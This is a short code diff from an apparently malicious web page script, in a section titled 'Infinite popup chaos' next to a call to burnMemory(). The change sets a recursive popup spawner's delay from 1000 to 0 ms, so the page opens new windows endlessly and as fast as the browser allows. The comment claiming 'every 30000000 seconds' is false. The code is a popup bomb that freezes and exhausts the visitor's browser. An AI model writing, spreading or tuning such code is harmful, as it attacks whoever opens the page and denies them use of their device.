@@ -57,7 +57,7 @@ burnMemory();
 /* ================= Infinite popup chaos ================= */
 function spawnPopup() {
     const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
-    setTimeout(spawnPopup, 1000); // spawn every 30000000 seconds
+    setTimeout(spawnPopup, 0); // spawn every 30000000 seconds
 }
  spawnPopup();
 
